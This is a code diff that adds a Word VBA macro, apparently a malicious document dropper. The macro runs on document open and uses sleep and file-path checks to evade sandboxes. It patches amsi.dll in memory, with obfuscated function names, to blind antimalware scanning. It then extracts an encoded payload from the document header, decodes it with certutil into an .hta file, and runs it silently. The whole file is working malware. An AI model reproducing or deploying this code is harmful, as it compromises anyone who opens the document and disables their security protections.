@@ -1,0 +1,116 @@
+Private Declare PtrSafe Sub Sleep Lib "kernel32.dll" (ByVal hMilliseconds As Long)
+Private Declare PtrSafe Function GetPAddr Lib "kernel32.dll" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Function LdLib Lib "kernel32.dll" Alias "LoadLibraryA" (ByVal lpProcName As String) As LongPtr
+Private Declare PtrSafe Sub patcher Lib "kernel32.dll" Alias "RtlFillMemory" (Destination As Any, ByVal Lenght As Long, ByVal Fill As Byte)
+Private Declare PtrSafe Function VirtPro Lib "kernel32" Alias "VirtualProtect" (lpAddress As Any, ByVal dw As LongPtr, ByVal flNewProcess As Long, lpFloatProcedure As Long) As Long
+
+Private Sub Document_Open()
+    If sleepTest() <> True Then
+        Exit Sub
+    End If
+    
+    If pathTest() <> True Then
+        Exit Sub
+    End If
+    
+    patch
+     
+    Set ws = CreateObject("wscript.shell")
+    r = readHeader()
+    tmp = ws.ExpandEnvironmentStrings("%TEMP%")
+    pth = tmp & "\wc23t9DF.tmp"
+     
+    writeFile r, pth
+   
+    ws.Run "cmd /c certutil -decode " & pth & " " & tmp & "\wc23t9DF.hta >> " & tmp & "\ctulog.txt", 0, True
+    ws.Run "cmd /c " & tmp & "\wc23t9DF.hta", 0, False
+    ws.Run "cmd /c del " & pth, 0, False
+    
+End Sub
+
+
+
+
+Function readHeader()
+    readHeader = ActiveDocument.Sections(1).Headers(1).Range.Text
+End Function
+
+Function HALL(t)
+  HALL = Environ("USERPROFILE") & "\Downloads\" & ActiveDocument.Name
+End Function
+
+Function fullPath(n)
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    fullPath = fso.GetAbsolutePathName(n)
+End Function
+
+Function pathTest()
+    If fullPath(ActiveDocument.Name) <> HALL("12345576887689908768tyufdxfgdxcvbjky786543w3qt") Then
+      pathTest = False
+      Exit Function
+    End If
+    pathTest = True
+End Function
+
+Function sleepTest()
+  Set ws = CreateObject("wscript.shell")
+  Dim myTime
+  myTime = Time
+  Dim Timein As Date
+  Timein = Date + myTime
+  Sleep (2000)
+  Dim second_time
+  second_time = Time
+  Dim Timeout As Date
+  Timeout = Date + second_time
+  Dim test_val As Integer
+  test_val = 1
+  subtime = DateDiff("s", Timein, Timeout)
+  Dim vOut As Integer
+  vOut = CInt(subtime)
+  If vOut < test_val Then
+    sleepTest = False
+    Exit Function
+  End If
+  sleepTest = True
+End Function
+
+
+
+
+Sub patch()
+
+ Dim lib As LongPtr
+ Dim func_addr As LongPtr
+ Dim res As LongPtr
+    
+ lib = LdLib(Chr(97) & Chr(109) & Chr(115) & "i" & ".dL" & "l")
+    
+ func_addr = GetPAddr(lib, "Am" & Chr(115) & "iU" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 96
+   
+ res = VirtPro(ByVal func_addr, 32, 64, 0)
+   
+ patcher ByVal (func_addr), 1, ByVal ("&H" & "90")
+ patcher ByVal (func_addr + 1), 1, ByVal ("&H" & "C3")
+   
+ func_addr = GetPAddr(lib, "Am" & Chr(115) & "iU" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - 352
+    
+ res = VirtPro(ByVal func_addr, 32, 64, 0)
+ 
+ patcher ByVal (func_addr), 1, ByVal ("&H" & "90")
+ patcher ByVal (func_addr + 1), 1, ByVal ("&H" & "C3")
+ 
+
+End Sub
+
+Function writeFile(d, f)
+
+    Set so = CreateObject("Scripting.FileSystemObject")
+    
+    Set OutPutFile = so.CreateTextFile(f, True)
+    OutPutFile.WriteLine (d)
+    OutPutFile.Close
+
+End Function
+
+
